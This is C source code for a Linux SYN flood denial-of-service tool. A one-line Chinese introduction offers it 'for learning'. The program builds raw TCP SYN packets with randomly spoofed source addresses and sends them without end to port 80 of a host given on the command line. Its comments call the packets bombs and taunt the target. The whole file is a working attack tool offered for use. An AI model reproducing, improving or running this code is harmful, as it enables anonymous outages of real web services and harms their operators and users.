//以下就是linux下DDOS程式碼ddos.c，下面有詳細的代碼，供大家學習。
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <unistd.h> 
#include <stdio.h> 
#include <netdb.h> 

#define DESTPORT 80 /* 要攻擊的埠(WEB) */ 
#define LOCALPORT 8888 

void send_tcp(int sockfd,struct sockaddr_in *addr); 
unsigned short check_sum(unsigned short *addr,int len); 

int main(int argc,char **argv) 
{ 
	int sockfd; 
	struct sockaddr_in addr; 
	struct hostent *host; 
	int on=1; 
	if(argc!=2) 
	{ 
		fprintf(stderr,"Usage:%s hostname\n\a",argv[0]); 
		exit(1); 
	} 

	bzero(&addr,sizeof(struct sockaddr_in)); 
	addr.sin_family=AF_INET; 
	addr.sin_port=htons(DESTPORT); 

	if(inet_aton(argv[1],&addr.sin_addr)==0) 
	{ 
		host=gethostbyname(argv[1]); 
		if(host==NULL) 
		{ 
			fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno)); 
			exit(1); 
		} 
		addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]); 
	} 

	/**** 使用IPPROTO_TCP創建一個TCP的原始套接字 ****/ 

	sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); 
	if(sockfd<0) 
	{ 
		fprintf(stderr,"Socket Error:%s\n\a",strerror(errno)); 
		exit(1); 
	} 
	/******** 設置IP資料包格式,告訴系統內核模組IP資料包由我們自己來填寫 ***/ 

	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)); 

	/**** 沒有辦法,只用超級護用戶才可以使用原始套接字 *********/ 
	setuid(getpid()); 

	/********* 發送炸彈了!!!! ****/ 
	send_tcp(sockfd,&addr); 
} 

/******* 發送炸彈的實現 *********/ 
void send_tcp(int sockfd,struct sockaddr_in *addr) 
{ 
	char buffer[100]; /**** 用來放置我們的資料包 ****/ 
	struct ip *ip; 
	struct tcphdr *tcp; 
	int head_len; 

	/******* 我們的資料包實際上沒有任何內容,所以長度就是兩個結構的長度 ***/ 

	head_len=sizeof(struct ip)+sizeof(struct tcphdr); 

	bzero(buffer,100); 

	/******** 填充IP資料包的頭部,還記得IP的頭格式嗎? ******/ 
	ip=(struct ip *)buffer; 
	ip->ip_v=IPVERSION; /** 版本一般的是 4 **/ 
	ip->ip_hl=sizeof(struct ip)>>2; /** IP資料包的頭部長度 **/ 
	ip->ip_tos=0; /** 服務類型 **/ 
	ip->ip_len=htons(head_len); /** IP數據包的長度 **/ 
	ip->ip_id=0; /** 讓系統去填寫吧 **/ 
	ip->ip_off=0; /** 和上面一樣,省點時間 **/ 
	ip->ip_ttl=MAXTTL; /** 最長的時間 255 **/ 
	ip->ip_p=IPPROTO_TCP; /** 我們要發的是 TCP包 **/ 
	ip->ip_sum=0; /** 校驗和讓系統去做 **/ 
	ip->ip_dst=addr->sin_addr; /** 我們攻擊的物件 **/ 

	/******* 開始填寫TCP資料包 *****/ 
	tcp=(struct tcphdr *)(buffer +sizeof(struct ip)); 
	tcp->source=htons(LOCALPORT); 
	tcp->dest=addr->sin_port; /** 目的埠 **/ 
	tcp->seq=random(); 
	tcp->ack_seq=0; 
	tcp->doff=5; 
	tcp->syn=1; /** 我要建立連接 **/ 
	tcp->check=0; 


	/** 好了,一切都準備好了.伺服器,你準備好了沒有?? **/ 
	while(1) 
	{ 
		/** 你不知道我是從那裏來的,慢慢的去等吧! **/ 
		ip->ip_src.s_addr=random(); 

		/** 什麼都讓系統做了,也沒有多大的意思,還是讓我們自己來校驗頭部吧 */ 
		/** 下麵這條可有可無 */ 
		tcp->check=check_sum((unsigned short *)tcp, 
		sizeof(struct tcphdr)); 
		sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in)); 
	} 
} 

/* 下麵是首部校驗和的演算法,偷了別人的 */ 
unsigned short check_sum(unsigned short *addr,int len) 
{ 
	register int nleft=len; 
	register int sum=0; 
	register short *w=addr; 
	short answer=0; 

	while(nleft>1) 
	{ 
		sum+=*w++; 
		nleft-=2; 
	} 
	if(nleft==1) 
	{ 
		*(unsigned char *)(&answer)=*(unsigned char *)w; 
		sum+=answer; 
	} 

	sum=(sum>>16)+(sum&0xffff); 
	sum+=(sum>>16); 
	answer=~sum; 
	return(answer); 
}

